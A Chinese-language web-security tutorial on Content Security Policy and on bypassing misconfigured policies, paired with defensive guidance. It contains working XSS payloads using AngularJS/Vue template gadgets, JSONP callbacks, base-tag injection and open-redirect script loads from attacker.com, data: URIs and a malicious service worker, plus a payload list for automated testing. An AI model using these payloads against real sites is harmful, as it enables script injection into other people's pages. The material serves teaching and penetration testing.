# CSP 绕过技术

## 概述

内容安全策略 (Content Security Policy, CSP) 是一种重要的 Web 安全机制，用于防御 XSS 和数据注入攻击。然而，配置不当的 CSP 可能被绕过。本文介绍 CSP 的工作原理以及常见的绕过技术。

---

## 基础概念

### 定义

**CSP (Content Security Policy)** 是一个额外的安全层，通过 HTTP 响应头或 meta 标签指定浏览器可以从哪些来源加载资源。它是一种白名单机制，能有效减少 XSS 攻击面。

**基本语法**:

```http
Content-Security-Policy: directive source; directive source
```

**常见指令**:

- `default-src`: 默认策略
- `script-src`: JavaScript 来源
- `style-src`: CSS 来源
- `img-src`: 图片来源
- `connect-src`: XMLHttpRequest、WebSocket 等连接来源
- `font-src`: 字体来源
- `object-src`: `<object>`, `<embed>`, `<applet>` 来源
- `media-src`: `<audio>`, `<video>` 来源
- `frame-src`: 框架来源

### 核心原理

#### CSP 工作流程

1. 服务器发送 CSP 头部
2. 浏览器解析策略
3. 浏览器检查每个资源加载请求
4. 违反策略的请求被阻止
5. 违规报告（如配置了 `report-uri`）

#### CSP 级别

- **CSP Level 1** (2012): 基础指令，白名单机制
- **CSP Level 2** (2015): 添加 `nonce` 和 `hash`，更多指令
- **CSP Level 3** (草案): `strict-dynamic`，`unsafe-hashes` 等

---

## 详细内容

### CSP 配置示例

#### 严格 CSP (推荐)

```http
Content-Security-Policy:
  default-src 'none';
  script-src 'nonce-random123' 'strict-dynamic';
  style-src 'nonce-random456';
  img-src 'self' https:;
  font-src 'self';
  connect-src 'self';
  base-uri 'none';
  form-action 'self';
```

#### 宽松 CSP (易受攻击)

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.example.com;
```

### 主要绕过技术

#### 1. **利用白名单 CDN**

如果 CSP 允许某些 CDN，攻击者可以寻找该 CDN 上的可利用脚本。

**易受攻击的配置**:

```http
Content-Security-Policy: script-src 'self' https://cdnjs.cloudflare.com
```

**绕过方法**:

```html
<!-- 利用 CDN 上的 AngularJS -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.min.js"></script>
<div ng-app ng-csp>{{ constructor.constructor('alert(1)')() }}</div>

<!-- 利用 JSONP 端点 -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert"></script>
```

**常见可利用的库**:

- AngularJS: 模板注入
- jQuery: JSONP
- Prototype.js: DOM 注入
- Google Analytics: `_gaq.push`

#### 2. **利用 `unsafe-inline` 和 `unsafe-eval`**

**易受攻击的配置**:

```http
Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval'
```

**绕过方法**:

```html
<!-- unsafe-inline 允许内联脚本 -->
<script>
  alert(document.domain);
</script>

<!-- unsafe-eval 允许 eval -->
<script>
  eval("alert(1)");
</script>
<script>
  setTimeout("alert(1)", 0);
</script>
<script>
  Function("alert(1)")();
</script>
```

#### 3. **Base 标签注入**

如果 CSP 没有设置 `base-uri`，可以通过注入 `<base>` 标签劫持相对路径。

**易受攻击的配置**:

```http
Content-Security-Policy: script-src 'self'
```

**绕过方法**:

```html
<!-- 原始页面有相对路径脚本 -->
<!-- <script src="/js/app.js"></script> -->

<!-- 注入 base 标签 -->
<base href="https://attacker.com/" />

<!-- 现在 /js/app.js 会从 https://attacker.com/js/app.js 加载 -->
```

**防御**: 设置 `base-uri 'none'` 或 `base-uri 'self'`

#### 4. **利用 Nonce 重用**

如果同一个 nonce 在多个脚本中重用，攻击者可以注入使用相同 nonce 的脚本。

**易受攻击的代码**:

```html
<!-- 服务器使用固定或可预测的 nonce -->
<script nonce="abc123" src="/static/app.js"></script>

<!-- 攻击者注入 -->
<script nonce="abc123">
  alert(1);
</script>
```

**防御**: 每个请求生成随机 nonce

#### 5. **利用 Script Gadgets**

某些框架或库提供的功能可以被滥用来执行代码。

**示例：AngularJS (CSP 模式)**:

```html
<div ng-app ng-csp>{{ constructor.constructor('alert(1)')() }}</div>
```

**示例：Vue.js**:

```html
<div id="app">{{ constructor.constructor('alert(1)')() }}</div>
<script src="https://cdn.jsdelivr.net/npm/vue@2"></script>
<script>
  new Vue({ el: "#app" });
</script>
```

#### 6. **利用 Dangling Markup**

通过不闭合标签来"吸收"后续内容。

**示例**:

```html
<!-- 注入点 -->
<input value="[INJECTION]">

<!-- 注入内容 -->
<input value="<base href='https://attacker.com/'>

<!-- 后续所有相对链接将指向攻击者服务器 -->
```

#### 7. **利用 iframe 和 srcdoc**

**易受攻击的配置**:

```http
Content-Security-Policy: script-src 'self'
```

**绕过方法**:

```html
<iframe srcdoc="<script>alert(origin)</script>"></iframe>
```

**注意**: `srcdoc` 继承父页面的 CSP，但某些浏览器实现有缺陷。

**防御**: 设置 `frame-src` 和 `child-src`

#### 8. **利用重定向**

如果白名单域名存在开放重定向漏洞：

**易受攻击的配置**:

```http
Content-Security-Policy: script-src 'self' https://trusted.com
```

**绕过方法**:

```html
<!-- trusted.com 有开放重定向 -->
<script src="https://trusted.com/redirect?url=https://attacker.com/evil.js"></script>
```

#### 9. **利用 `data:` URI**

**易受攻击的配置**:

```http
Content-Security-Policy: script-src 'self' data:
```

**绕过方法**:

```html
<script src="data:text/javascript,alert(1)"></script>
<object data="data:text/html,<script>alert(1)</script>"></object>
```

**防御**: 避免在 `script-src` 中使用 `data:`

#### 10. **利用 Service Worker**

Service Worker 可以拦截和修改网络请求。

**绕过方法**:

```javascript
// 注册恶意 Service Worker
navigator.serviceWorker.register("/evil-sw.js");

// evil-sw.js
self.addEventListener("fetch", (event) => {
  if (event.request.url.includes("legitimate.js")) {
    event.respondWith(new Response("alert(1)"));
  }
});
```

**防御**: 严格限制 Service Worker 的来源

---

## 实战示例

### 示例 1: 检测 CSP 配置

```javascript
// 提取页面的 CSP 策略
function getCSP() {
  // 方法1: 从 meta 标签
  const metaCSP = document.querySelector(
    'meta[http-equiv="Content-Security-Policy"]'
  );
  if (metaCSP) {
    console.log("Meta CSP:", metaCSP.content);
  }

  // 方法2: 通过违规测试
  const img = new Image();
  img.onerror = () => console.log("Image blocked by CSP");
  img.src = "https://attacker.com/test.jpg";

  // 方法3: 查看控制台错误
  console.log("Check console for CSP violations");
}

getCSP();
```

### 示例 2: 自动化 CSP 绕过测试

```javascript
// CSP Bypass Checker
const payloads = [
  "<script>alert(1)</script>",
  "<img src=x onerror=alert(1)>",
  "<svg onload=alert(1)>",
  '<iframe src="javascript:alert(1)">',
  '<base href="https://attacker.com/">',
  '<link rel="import" href="https://attacker.com/evil.html">',
  '<object data="data:text/html,<script>alert(1)</script>">',
];

function testCSP() {
  payloads.forEach((payload, i) => {
    try {
      const div = document.createElement("div");
      div.innerHTML = payload;
      document.body.appendChild(div);
      console.log(`Payload ${i} injected:`, payload);
    } catch (e) {
      console.log(`Payload ${i} blocked:`, e.message);
    }
  });
}

testCSP();
```

### 示例 3: 利用 AngularJS 绕过 CSP

```html
<!DOCTYPE html>
<html>
  <head>
    <meta
      http-equiv="Content-Security-Policy"
      content="script-src 'self' https://ajax.googleapis.com"
    />
  </head>
  <body>
    <!-- 加载 AngularJS -->
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>

    <!-- CSP 绕过 -->
    <div ng-app ng-csp>
      {{ constructor.constructor('alert(document.domain)')() }}
    </div>

    <!-- 或者使用 ng-focus -->
    <input
      ng-app
      ng-csp
      ng-focus="constructor.constructor('alert(1)')()"
      autofocus
    />
  </body>
</html>
```

---

## 最佳实践

### 防御方

1. **使用严格的 CSP**

   ```http
   Content-Security-Policy:
     default-src 'none';
     script-src 'nonce-RANDOM' 'strict-dynamic';
     object-src 'none';
     base-uri 'none';
   ```

2. **避免使用不安全的指令**

   - 禁用 `'unsafe-inline'`
   - 禁用 `'unsafe-eval'`
   - 禁用 `data:` URI（对于脚本）

3. **使用 Nonce 或 Hash**

   ```html
   <!-- 每次请求生成随机 nonce -->
   <script nonce="{{ random_nonce }}">
     // 内联脚本
   </script>
   ```

4. **限制 CDN 白名单**

   - 仅允许必要的 CDN
   - 使用 SRI (Subresource Integrity) 验证

   ```html
   <script
     src="https://cdn.example.com/lib.js"
     integrity="sha384-..."
     crossorigin="anonymous"
   ></script>
   ```

5. **使用 CSP 报告**
   ```http
   Content-Security-Policy-Report-Only:
     default-src 'self';
     report-uri /csp-report
   ```

### 攻击方（渗透测试）

1. **收集信息**

   - 查看 HTTP 响应头
   - 检查 `<meta>` 标签
   - 查看控制台 CSP 违规报告

2. **识别弱点**

   - 是否使用 `unsafe-inline` 或 `unsafe-eval`
   - 白名单是否包含可利用的 CDN
   - 是否缺少 `base-uri` 限制

3. **构造 Payload**

   - 根据允许的来源选择攻击向量
   - 测试 Script Gadgets
   - 尝试协议级绕过

4. **验证绕过**
   - 在浏览器中测试
   - 检查是否触发 CSP 违规
   - 确认代码执行

---

## 常见问题

### Q: CSP 能完全防止 XSS 吗？

**A**: 不能。CSP 是深度防御的一层，可以显著减少 XSS 攻击面，但：

- 配置不当的 CSP 可能被绕过
- 不保护服务器端漏洞
- 某些浏览器支持不完整
- 需要配合其他安全措施（输入验证、输出编码等）

### Q: `strict-dynamic` 是什么？

**A**: `'strict-dynamic'` 是 CSP Level 3 的特性，允许带有有效 nonce/hash 的脚本动态加载其他脚本：

```http
Content-Security-Policy: script-src 'nonce-random' 'strict-dynamic'
```

好处：

- 简化策略管理
- 自动信任通过 nonce 验证的脚本加载的子脚本
- 向后兼容

### Q: 如何测试我的 CSP 配置？

**A**: 使用以下工具：

1. **Google CSP Evaluator**: https://csp-evaluator.withgoogle.com/
2. **CSP Scanner**: 浏览器扩展
3. **手动测试**: 注入各种 XSS payload
4. **Report-Only 模式**: 先观察而不阻止

### Q: Nonce 和 Hash 有什么区别？

**A**:

**Nonce** (Number used once):

- 服务器为每个请求生成随机值
- 脚本标签必须包含匹配的 nonce
- 动态内容友好

```html
<script nonce="r@nd0m">
  alert(1);
</script>
```

**Hash**:

- 对脚本内容计算哈希值
- 脚本内容必须与哈希完全匹配
- 适合静态脚本

```http
Content-Security-Policy: script-src 'sha256-hash_of_script_content'
```

---

## 进阶阅读

### 官方文档

- [MDN Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [W3C CSP Level 3 规范](https://www.w3.org/TR/CSP3/)
- [Google Web Fundamentals - CSP](https://developers.google.com/web/fundamentals/security/csp)

### 安全研究

- [CSP Is Dead, Long Live CSP!](https://research.google/pubs/pub45542/) - Google 研究
- [CSP Bypasses 集合](https://github.com/PortSwigger/csp-bypass)
- [Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html) - OWASP

### 工具

- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [Report URI](https://report-uri.com/) - CSP 报告收集
- [CSP Scanner](https://github.com/mozilla/http-observatory)

---

## 相关章节

- [XSS 漏洞利用](../02-Techniques/xss_exploitation.md)
- [浏览器安全机制](../01-Foundations/browser_security.md)
- [HTTP 安全头部](../01-Foundations/http_security_headers.md)
- [DOM XSS 检测](../02-Techniques/dom_xss_detection.md)
